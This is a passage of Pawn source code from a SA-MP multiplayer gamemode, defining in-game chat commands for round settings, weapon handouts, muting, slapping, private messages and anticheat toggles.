			format(TeamName[ATTACKER], 24, TeamNamee);
			format(TeamName[ATTACKER_SUB], 24, "%s Sub", TeamName[ATTACKER]);
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set attacker team name to: {FFFFFF}%s", Player[playerid][Name], TeamName[ATTACKER]);
			SendClientMessageToAll(-1, iString);
	    } case 1: {
			format(TeamName[DEFENDER], 24, TeamNamee);
			format(TeamName[DEFENDER_SUB], 24, "%s Sub", TeamName[DEFENDER]);
			format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has set defender team name to: {FFFFFF}%s", Player[playerid][Name], TeamName[DEFENDER]);
			SendClientMessageToAll(-1, iString);
	    }
	}

	format(iString, sizeof(iString), "~r~%s %s(~r~%d%s)  ~b~~h~%s %s(~b~~h~%d%s)",TeamName[ATTACKER],MAIN_TEXT_COLOUR,TeamScore[ATTACKER],MAIN_TEXT_COLOUR,TeamName[DEFENDER],MAIN_TEXT_COLOUR,TeamScore[DEFENDER],MAIN_TEXT_COLOUR);
    TextDrawSetString(TeamScoreText, iString);

	return 1;
}


CMD:tr(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/tr [Total Rounds]");

	new Value = strval(params);
	if(Value < CurrentRound || Value < 1 || Value > 100) return SendErrorMessage(playerid,"Invalid total rounds.");

	TotalRounds = Value;

	new iString[180];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed the total rounds to: {FFFFFF}%d", Player[playerid][Name], TotalRounds);
	SendClientMessageToAll(-1, iString);

	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

	return 1;
}

CMD:cr(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/cr [Current Round]");

	new Value = strval(params);
	if(Value > TotalRounds || Value < 0) return SendErrorMessage(playerid,"Invalid current round.");

	CurrentRound = Value;

	new iString[180];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has changed the current round to: {FFFFFF}%d", Player[playerid][Name], CurrentRound);
	SendClientMessageToAll(-1, iString);

	format(iString, sizeof(iString), "%sRounds ~r~~h~%d~r~/~h~~h~%d", MAIN_TEXT_COLOUR, CurrentRound, TotalRounds);
	TextDrawSetString(RoundsPlayed, iString);

	return 1;
}

CMD:serverpassword(playerid, params[]) {
	if(ServerLocked) {
		new str[128];
		format(str, sizeof(str), ""COL_PRIM"Current Server Password: {FFFFFF}%s", ServerPass[9]);
		SendClientMessageToAll(-1, str);
	} else return 0;
	LogAdminCommand("serverpassword", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:servpass(playerid, params[]) {
	return cmd_serverpassword(playerid, params);
}

CMD:sp(playerid, params[]) {
	return cmd_serverpassword(playerid, params);
}

CMD:freeze(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/freeze [Player ID]");

	new pID = strval(params);
 	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isnt connected.");

	TogglePlayerControllableEx(pID, false);


	new iString[160];
    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has frozen {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);

    LogAdminCommand("freeze", playerid, pID);
	return 1;
}

CMD:giveweapon(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	new pID, Weapon[50], Ammo, iString[180];

 	if(sscanf(params, "isd", pID, Weapon, Ammo))  return SendUsageMessage(playerid,"/giveweapon [Player ID] [Weapon Name] [Ammo]");

	if(Ammo < 0 || Ammo > 9999) return SendErrorMessage(playerid,"Invalid Ammo.");

	new WeaponID = GetWeaponID(Weapon);
	if(WeaponID < 1 || WeaponID > 46 || WeaponID == 19 || WeaponID == 20 || WeaponID == 21 || WeaponID == 22) return SendErrorMessage(playerid,"Invalid Weapon Name.");
	if(WeaponID == 44 || WeaponID == 45) return SendErrorMessage(playerid,"We don't do this shit around here.");

	GivePlayerWeapon(pID, WeaponID, Ammo);

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has given {FFFFFF}%s "COL_PRIM"| Weapon: {FFFFFF}%s "COL_PRIM"- Ammo: {FFFFFF}%d", Player[playerid][Name], Player[pID][Name], WeaponNames[WeaponID], Ammo);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("giveweapon", playerid, pID);
	return 1;
}

CMD:giveallgun(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

 	new iString[180], Ammo, Weapon[50];
 	if(sscanf(params, "sd", Weapon, Ammo))  return SendUsageMessage(playerid,"/giveallgun [Weapon Name] [Ammo]");

	if(Ammo < 0 || Ammo > 9999) return SendErrorMessage(playerid,"Invalid Ammo.");

	new weapon = GetWeaponID(Weapon);
 	if(weapon < 1 || weapon > 46 || weapon == 19 || weapon == 20 || weapon == 21 || weapon == 22) return SendErrorMessage(playerid,"Invalid weapon name.");
	if(weapon == 44 || weapon == 45) return SendErrorMessage(playerid,"We don't do this shit around here.");

    foreach(new i : Player) {
    	if(Player[i][InDM] == false && Player[i][InDuel] == false  && Player[i][Spectating] == false) {
			GivePlayerWeapon(i, weapon, Ammo);
		}
	}

	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has given everyone | Weapon: {FFFFFF}%s "COL_PRIM"- Ammo: {FFFFFF}%d",Player[playerid][Name] ,WeaponNames[weapon], Ammo);
 	SendClientMessageToAll(-1, iString);
    LogAdminCommand("giveallgun", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:unfreeze(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/freeze [Player ID]");

	new pID = strval(params);
 	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isnt connected.");

	TogglePlayerControllableEx(pID, true);


	new iString[160];
    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has unfrozen {FFFFFF}%s", Player[playerid][Name], Player[pID][Name]);
	SendClientMessageToAll(-1, iString);

    LogAdminCommand("unfreeze", playerid, pID);
	return 1;
}

CMD:maxtdmkills(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(Current != -1) return SendErrorMessage(playerid,"Can't use the command while round is on.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/maxtdmkills [5 - 90]");

	new val = strval(params);
	if(val < 5 || val > 90) return SendErrorMessage(playerid,"Maximum TDM kills can range b/w  5 - 90 kills only.");

	MaxTDMKills = val;

	new iString[160];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Max TDM Kills'", MaxTDMKills);
    db_free_result(db_query(sqliteconnection, iString));

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has changed the maximum TDM kills to {FFFFFF}%d", Player[playerid][Name], MaxTDMKills);
	SendClientMessageToAll(-1, iString);
	LogAdminCommand("maxtdmkills", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:roundtime(playerid,params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(Current != -1) return SendErrorMessage(playerid,"Can't use the command while round is on.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/roundtime [Mints (1 - 30)]");

	new rTime = strval(params);
	if(rTime < 1 || rTime > 30) return SendErrorMessage(playerid,"Round time can't be lower than 1 or higher than 30 mints.");

	ConfigRoundTime = rTime;

	new iString[160];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Round Time'", rTime);
    db_free_result(db_query(sqliteconnection, iString));

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has changed the round time to: {FFFFFF}%d mints", Player[playerid][Name], rTime);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("roundtime", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:cptime(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
//	if(Current != -1) return SendErrorMessage(playerid,"Can't use the command while round is on.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/cptime [Seconds (1 - 60)]");

	new cpTime = strval(params);
	if(cpTime < 1 || cpTime > 60) return SendErrorMessage(playerid,"CP time can't be lower than 1 or higher than 60 seconds.");

	ConfigCPTime = cpTime;
	CurrentCPTime = ConfigCPTime;

	new iString[160];
	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'CP Time'", cpTime);
    db_free_result(db_query(sqliteconnection, iString));

    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has changed the CP time to: {FFFFFF}%d seconds", Player[playerid][Name], cpTime);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("cptime", playerid, INVALID_PLAYER_ID);
	return 1;
}




CMD:lastplayed(playerid,params[])
{
	new iString[140];
	format(iString, sizeof(iString), ""COL_PRIM"Last Played: {FFFFFF}%d "COL_PRIM"| Requested by {FFFFFF}%s", ServerLastPlayed, Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
	return 1;
}

CMD:rounds(playerid,params[])
{
	new str1[1024];
	for( new id = 0; id < 101; id++ ) {
	    if( MatchRoundsRecord[ id ][ round__ID ] != -1 ) {
	        switch( MatchRoundsRecord[ id ][ round__type ] ) {
	    /*base*/case 0: format( str1, sizeof(str1), "%s\n{FFFFFF}%d.%s%s [ID:%d]", str1, id, (MatchRoundsRecord[ id ][ round__completed ]) ? ("") : ("{FAF62D}"), BName[ MatchRoundsRecord[ id ][ round__ID ] ], MatchRoundsRecord[ id ][ round__ID ] );
	   /*arena*/case 1: format( str1, sizeof(str1), "%s\n{B5B5B5}%d.%s%s [ID:%d]", str1, id, (MatchRoundsRecord[ id ][ round__completed ]) ? ("") : ("{FAF62D}"), AName[ MatchRoundsRecord[ id ][ round__ID ] ], MatchRoundsRecord[ id ][ round__ID ] );
				default: format( str1, sizeof(str1), "%s\nWadaffuq?", str1 );
	        }
	    }
	}

	//print(str1);

	ShowPlayerDialog( playerid, DIALOG_ROUND_LIST, DIALOG_STYLE_MSGBOX, "Rounds played in current/last match", str1, "Close", "" );
	return 1;
}


CMD:dance(playerid, params[])
{
	if(Current != -1) return SendErrorMessage(playerid,"Can't use this command while in round.");
	if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/dance [1-4]");

	new dID = strval(params);
	if(dID < 1 || dID > 4) return SendErrorMessage(playerid,"Invalid dance ID.");

	switch(dID) {
		case 1: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE1);
		case 2: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE2);
		case 3: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE3);
		case 4: SetPlayerSpecialAction(playerid,SPECIAL_ACTION_DANCE4);
	}
	return 1;
}


CMD:resetallguns(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	foreach(new i : Player) {
	    if(Player[i][InDM] == false && Player[i][InDuel] == false && Player[i][Spectating] == false) {
	    	ResetPlayerWeapons(i);
		}
	}

	new iString[160];
    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has resetted everyone's weapons.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("resetallguns", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:replace(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(Current == -1) return SendErrorMessage(playerid,"Round is not active.");

	new str[2048];
	foreach(new i : Player)
	{
	    if(Player[i][InDuel] == true || Player[i][Playing] == true)
	        continue;

		format(str, sizeof str, "%s%s\n", str, Player[i][Name]);
	}
	ShowPlayerDialog(playerid, DIALOG_REPLACE_FIRST, DIALOG_STYLE_LIST, ""COL_PRIM"Player to add", str, "Process", "Cancel");
	LogAdminCommand("replace", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:cc(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

    ClearChat();

    new iString[128];
    format(iString,sizeof(iString),"{FFFFFF}%s "COL_PRIM"has cleared chat.", Player[playerid][Name]);
	SendClientMessageToAll(-1, iString);
    LogAdminCommand("cc", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:vworld(playerid, params[])
{
	if(Player[playerid][InDM] == false) return SendErrorMessage(playerid,"Can't use this command while you are not in a DM.");
	if(Player[playerid][InDuel] == true) return SendErrorMessage(playerid,"Can't use this command during duel. Use {FFFFFF}/rq "COL_PRIM"instead.");
	if(Player[playerid][Playing] == true) return SendErrorMessage(playerid,"Can't use this command while playing.");
	if(Player[playerid][Spectating] == true) return 1;

    if(isnull(params) || !IsNumeric(params)) return SendUsageMessage(playerid,"/vworld [World ID]");

	new vID = strval(params);
	if(vID <= 5) return SendErrorMessage(playerid,"Pick a virtual world above 5.");

	SetPlayerVirtualWorld(playerid, vID);

	return 1;
}


CMD:pchannel(playerid, params[])
{
	if(Player[playerid][ChatChannel] != -1) {
		new iString[356];
		iString = "{FF3333}Players in channel:\n\n";

		foreach(new i : Player) {
		    if(Player[i][ChatChannel] == Player[playerid][ChatChannel]) {
		        format(iString, sizeof(iString), "%s{FF3333} - {FFFFFF}%s (%d)\n", iString, Player[i][Name], i);
			}
		}

		ShowPlayerDialog(playerid,DIALOG_CHANNEL_PLAYERS,DIALOG_STYLE_MSGBOX,"{FFFFFF}Players In Channel", iString, "Close","");
	} else {
    	SendErrorMessage(playerid,"You are not in any channel.");
	}

	return 1;
}



CMD:cchannel(playerid, params[])
{
	new iString[180];
	if(isnull(params)) {
		if(Player[playerid][ChatChannel] != -1) {
		    format(iString, sizeof(iString), "{FFFFFF}>> "COL_PRIM"Current chat channel ID: {FFFFFF}%d", Player[playerid][ChatChannel]);
		    SendClientMessage(playerid, -1, iString);
		} else {
			SendUsageMessage(playerid,"/chatchannel [Channel ID]");
		}
		return 1;
	}

	new Channel = strval(params);
	if(Channel <= -1 || Channel > 1000) return SendErrorMessage(playerid,"Invalid channel ID.");

	Player[playerid][ChatChannel] = Channel;

	format(iString, sizeof(iString), "UPDATE Players SET ChatChannel = %d WHERE Name = '%s'", Channel, DB_Escape(Player[playerid][Name]));
    db_free_result(db_query(sqliteconnection, iString));

	foreach(new i : Player) {
	    if(Player[i][ChatChannel] == Player[playerid][ChatChannel] && i != playerid) {
	        format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined this chat channel.", Player[playerid][Name]);
	        SendClientMessage(i, -1, iString);
		} else {
	        format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has joined a chat channel.", Player[playerid][Name]);
	        SendClientMessage(i, -1, iString);
		}
	}

	return 1;
}

CMD:showspectateinfo(playerid, params[])
{
	cmd_teamdmg(playerid, params);
	return 1;
}

CMD:teamdmg(playerid, params[])
{
	if(Player[playerid][Level] < 1 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	new iString[180];
	if(TeamHPDamage == true) {
	    TeamHPDamage = false;

		foreach(new i : Player) {
			TextDrawHideForPlayer(i, AttackerTeam[0]);
			TextDrawHideForPlayer(i, AttackerTeam[1]);
			TextDrawHideForPlayer(i, DefenderTeam[0]);
			TextDrawHideForPlayer(i, DefenderTeam[1]);
			TextDrawHideForPlayer(i, AttackerTeam[2]);
			TextDrawHideForPlayer(i, AttackerTeam[3]);
			TextDrawHideForPlayer(i, DefenderTeam[2]);
			TextDrawHideForPlayer(i, DefenderTeam[3]);

	        //if(Player[i][Spectating] == true) {
               // PlayerTextDrawShow(i, SpecText[0]);
                //PlayerTextDrawShow(i, SpecText[1]);

	        //}

		}

		format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has disabled {FFFFFF}Show HP and Damage.",Player[playerid][Name]);
		SendClientMessageToAll(-1,iString);
	} else {
	    TeamHPDamage = true;

	    foreach(new i : Player) {
	        if(Current != -1) {
				if(Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB) {
					TextDrawShowForPlayer(i, AttackerTeam[0]);
					TextDrawShowForPlayer(i, AttackerTeam[1]);
				} else if(Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB) {
					TextDrawShowForPlayer(i, DefenderTeam[0]);
					TextDrawShowForPlayer(i, DefenderTeam[1]);
				}
			}

	        if(Player[i][Spectating] == true) {

	            //PlayerTextDrawHide(i, SpecText[0]);
	            //PlayerTextDrawHide(i, SpecText[1]);

				if(Current != -1) {
				    if(Player[i][Team] == ATTACKER || Player[i][Team] == ATTACKER_SUB) {
						TextDrawShowForPlayer(i, DefenderTeam[2]);
						TextDrawShowForPlayer(i, DefenderTeam[3]);
					} else if(Player[i][Team] == DEFENDER || Player[i][Team] == DEFENDER_SUB) {
						TextDrawShowForPlayer(i, AttackerTeam[2]);
						TextDrawShowForPlayer(i, AttackerTeam[3]);
					}
				}
			}
		}

		format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has enabled {FFFFFF}Show HP and Damage.",Player[playerid][Name]);
		SendClientMessageToAll(-1,iString);
	}

	format(iString, sizeof(iString), "UPDATE Configs SET Value = %d WHERE Option = 'Show Team HP and Dmg'", (TeamHPDamage == false ? 0 : 1));
    db_free_result(db_query(sqliteconnection, iString));
    LogAdminCommand("teamdmg", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:muteall(playerid, params[])
{
    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	foreach(new i : Player)
		Player[i][Mute] = true;
	AllMuted = true;
	new admName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, admName, sizeof(admName));
	SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has muted everyone!", admName));
    LogAdminCommand("muteall", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:unmuteall(playerid, params[])
{
    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	foreach(new i : Player)
		Player[i][Mute] = false;
	AllMuted = false;
	new admName[MAX_PLAYER_NAME];
	GetPlayerName(playerid, admName, sizeof(admName));
	SendClientMessageToAll(-1, sprintf("{FFFFFF}%s "COL_PRIM"has unmuted everyone!", admName));
    LogAdminCommand("unmuteall", playerid, INVALID_PLAYER_ID);
	return 1;
}

CMD:mute(playerid,params[])
{
	if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");

	new pID, Reason[128], iString[180];
    if(sscanf(params, "is", pID, Reason)) return SendUsageMessage(playerid,"/mute [Player ID] [Reason]");
	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isnt connected.");
	if(Player[pID][Level] >= Player[playerid][Level] && pID != playerid) return SendErrorMessage(playerid,"Can't mute someone of same or higher admin level.");


	if(Player[pID][Mute] == true) return SendErrorMessage(playerid,"That player is already muted.");
	if(Player[playerid][Level] <= Player[pID][Level] && playerid != pID) return SendErrorMessage(playerid,"That player is higher admin level than you.");

	Player[pID][Mute] = true;


	if(strlen(Reason)) format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has muted {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}%s",Player[playerid][Name],Player[pID][Name], Reason);
	else format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has muted {FFFFFF}%s "COL_PRIM"| Reason: {FFFFFF}No reason given.",Player[playerid][Name],Player[pID][Name]);
	SendClientMessageToAll(-1,iString);
    LogAdminCommand("mute", playerid, pID);
	return 1;
}

CMD:unmute(playerid, params[])
{
	if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	new pID = strval(params);

	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isnt connected.");
	if(Player[pID][Mute] == false) return SendErrorMessage(playerid,"That player is not muted.");

	Player[pID][Mute] = false;

	new iString[180];
	format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has unmuted {FFFFFF}%s",Player[playerid][Name],Player[pID][Name]);
	SendClientMessageToAll(-1,iString);
    LogAdminCommand("unmute", playerid, pID);
	return 1;
}

CMD:slap(playerid,params[])
{
	if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params)) return SendUsageMessage(playerid,"/slap [Player ID]");

	new sid = strval(params);
    if(!IsPlayerConnected(sid)) return SendErrorMessage(playerid,"That player isnt connected.");
	if(Player[sid][Level] >= Player[playerid][Level] && sid != playerid) return SendErrorMessage(playerid,"Can't slap someone of same or higher admin level.");

    new Float:Pos[3];
	GetPlayerPos(sid,Pos[0],Pos[1],Pos[2]);
	SetPlayerPos(sid,Pos[0],Pos[1],Pos[2]+10);

	PlayerPlaySound(playerid,1190,0.0,0.0,0.0);
	PlayerPlaySound(sid,1190,0.0,0.0,0.0);

	new iString[128];
	format(iString, sizeof(iString),"{FFFFFF}%s "COL_PRIM"has slapped {FFFFFF}%s",Player[playerid][Name],Player[sid][Name]);
	SendClientMessageToAll(-1,iString);
	LogAdminCommand("slap", playerid, sid);
	return 1;
}


CMD:explode(playerid,params[])
{
	if(Player[playerid][Level] < 2 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level to do that.");
	if(isnull(params)) return SendUsageMessage(playerid,"/explode [Player ID]");

	new eid = strval(params);
  	if(!IsPlayerConnected(eid)) return SendErrorMessage(playerid,"That Player Isn't Connected.");
	if(Player[eid][Level] >= Player[playerid][Level] && eid != playerid) return SendErrorMessage(playerid,"Can't explode someone of same or higher admin level.");

	new Float:Pos[3];
	GetPlayerPos(eid, Pos[0], Pos[1], Pos[2]);
	CreateExplosion(Pos[0], Pos[1], Pos[2], 7, 6.0);

	new iString[128];
	format(iString, sizeof(iString), "{FFFFFF}%s "COL_PRIM"has exploded {FFFFFF}%s",Player[playerid][Name],Player[eid][Name]);
	SendClientMessageToAll(-1, iString);
	LogAdminCommand("explode", playerid, eid);
	return 1;
}

CMD:getpara(playerid, params[])
{
	GivePlayerWeapon(playerid, PARACHUTE, 1);
    SendClientMessage(playerid, -1, "{FFFFFF}Parachute given.");
	return 1;
}

CMD:gp(playerid, params[])
{
	cmd_getpara(playerid, params);
	return 1;
}

CMD:para(playerid, params[])
{
	RemovePlayerWeapon(playerid, 46);
    SendClientMessage(playerid, -1, "{FFFFFF}Parachute removed.");
	return 1;
}

CMD:rp(playerid, params[])
{
	cmd_para(playerid, params);
	return 1;
}

CMD:knife(playerid, params[])
{
	RemovePlayerWeapon(playerid, WEAPON_KNIFE);
	return 1;
}

CMD:fixcp(playerid, params[])
{
	if(GameType == BASE && Player[playerid][Playing])
	{
        SetTimerEx("ReshowCPForPlayer", 1000, false, "i", playerid);
	}
	return 1;
}


CMD:pm(playerid,params[])
{
    if(Player[playerid][Mute] == true) return SendErrorMessage(playerid,"You are muted.");

	new recieverid, text[180];

	if(sscanf(params,"is",recieverid, text)) return SendUsageMessage(playerid,"/pm [Player ID] [Text]");
	if(!IsPlayerConnected(recieverid)) return SendErrorMessage(playerid,"Player not connected.");

	if(Player[recieverid][blockedid] == playerid) return SendErrorMessage(playerid,"That player has blocked PMs from you.");
	if(Player[recieverid][blockedall] == true) return SendErrorMessage(playerid,"That player has blocked PMs from everyone.");

	new String[180];
	format(String,sizeof(String),"{66CC00}*** PM from %s (%d): %s",Player[playerid][Name], playerid, text);
	SendClientMessage(recieverid,-1,String);
	SendClientMessage(recieverid,-1,""COL_PRIM"Use {FFFFFF}/r [Message]"COL_PRIM" to reply");

	Player[recieverid][LastMsgr] = playerid;

	format(String,sizeof(String),"{66CC00}*** PM to %s (%d): %s",Player[recieverid][Name], recieverid, text);
	SendClientMessage(playerid,-1,String);

	PlayerPlaySound(recieverid,1054,0,0,0);

	return 1;
}

CMD:r(playerid,params[])
{
    if(Player[playerid][Mute] == true) return SendErrorMessage(playerid,"You are muted.");

	new replytoid, text[180];
    replytoid = Player[playerid][LastMsgr];

   	if(!IsPlayerConnected(replytoid)) return SendErrorMessage(playerid,"That player is not connected.");
	if(Player[playerid][LastMsgr] == -1) return SendErrorMessage(playerid,"That player is not connected.");

	if(Player[replytoid][blockedid] == playerid) return SendErrorMessage(playerid,"That player has blocked PMs from you.");
	if(Player[replytoid][blockedall] == true) return SendErrorMessage(playerid,"That player has blocked PMs from everyone.");


	sscanf(params, "s", text);

	if(isnull(text)) return SendUsageMessage(playerid,"/r [Message]");
	if(strlen(text) > 100) return SendErrorMessage(playerid,"Message length should be less than 100 characters.");

	new String[180];
	format(String,sizeof(String),"{66CC00}*** PM from %s (%d): %s",Player[playerid][Name], playerid, text);
	SendClientMessage(replytoid,-1,String);
	format(String,sizeof(String),"{66CC00}*** PM to %s (%d): %s",Player[replytoid][Name], replytoid, text);
	SendClientMessage(playerid,-1,String);

    Player[replytoid][LastMsgr] = playerid;

	PlayerPlaySound(replytoid,1054,0,0,0);

	return 1;
}

CMD:blockpm(playerid, params[])
{
	if(isnull(params)) return SendUsageMessage(playerid,"/blockpm [Player ID]");

	new pID = strval(params);
  	if(!IsPlayerConnected(pID)) return SendErrorMessage(playerid,"That player isn't connected.");

  	Player[playerid][blockedid] = pID;

	new String[128];
  	format(String,sizeof(String),""COL_PRIM"You have blocked PMs from {FFFFFF}%s", Player[pID][Name]);
  	SendClientMessage(playerid,-1,String);

	return 1;
}

CMD:blockpmall(playerid, params[])
{
  	Player[playerid][blockedall] = true;
  	SendClientMessage(playerid,-1,""COL_PRIM"You have blocked PMs from everyone.");

	return 1;
}

CMD:nopm(playerid, params[])
{
	cmd_blockpm(playerid, params);
	return 1;
}

CMD:nopmall(playerid, params[])
{
	cmd_blockpmall(playerid, params);
	return 1;
}

CMD:admins(playerid, params[])
{
	new iString[356] = '\0';

	foreach(new i : Player) {
	    if(Player[i][Level] > 0) {
	    	format(iString, sizeof(iString), "%s{FFFFFF}%s ({FF3333}%d{FFFFFF})\n", iString, Player[i][Name], Player[i][Level]);
		}
	}

	format(iString, sizeof(iString), "%s\n\n"COL_PRIM"Rcon Admins\n", iString);

	foreach(new i : Player) {
	    if(IsPlayerAdmin(i)) {
	    	format(iString, sizeof(iString), "%s{FFFFFF}%s\n", iString, Player[i][Name]);
		}
	}

	if(strlen(iString) < 2) ShowPlayerDialog(playerid,DIALOG_ADMINS,DIALOG_STYLE_MSGBOX,"{FFFFFF}Admins Online", "No Admins online.","Ok","");
	else ShowPlayerDialog(playerid,DIALOG_ADMINS,DIALOG_STYLE_MSGBOX,"{FFFFFF}Admins Online", iString,"Ok","");

	return 1;
}

CMD:connstats( playerid, params[] )
{
    if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher level admin to do that.");

	new pID = INVALID_PLAYER_ID;

	if( sscanf(params, "d", pID) ) return SendUsageMessage(playerid,"/connStats <playerid>");
	if( !IsPlayerConnected(pID) ) return SendErrorMessage(playerid,"** Invalid PlayerID! ");

	new szString[80];
	format(szString, sizeof(szString), "(%d)%s's current connection status: %i.", pID, Player[pID][Name], NetStats_ConnectionStatus(pID) );
	SendClientMessage(playerid, -1, szString);
	return 1;
}

#if ANTICHEAT == 1
CMD:permac(playerid, params[])
{
    if(Player[playerid][Level] < 5 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	if(AntiCheat != true)
	{
	    SendErrorMessage(playerid,"AC must be running. Use /ac !");
	}
	else
	{
	    if(PermAC == true)
		{
			PermAC = false;
			SendClientMessage(playerid, -1, "AC is not permanent now!");
		}
		else
		{
		    PermAC = true;
			SendClientMessage(playerid, -1, "AC will be running permanently!");
		}
	}
	LogAdminCommand("permac", playerid, INVALID_PLAYER_ID);
	return 1;
}

#if ANTICHEAT == 1
CMD:ac(playerid, params[])
{
	if(Player[playerid][Level] < 3 && !IsPlayerAdmin(playerid)) return SendErrorMessage(playerid,"You need to be a higher admin level.");

	new iString[160], newhostname[128];

 	if(AntiCheat == true) {
 	    TextDrawHideForAll(ACText);
		TextDrawSetString(ACText, sprintf("%sAC v2: ~g~      ON", MAIN_TEXT_COLOUR));
		AntiCheat = false;
		format(newhostname, sizeof(newhostname), "hostname %s", hostname);
		SendRconCommand(newhostname);
		KillTimer(ACTimer);

	    AC_Toggle(false);
	    PermAC = false;
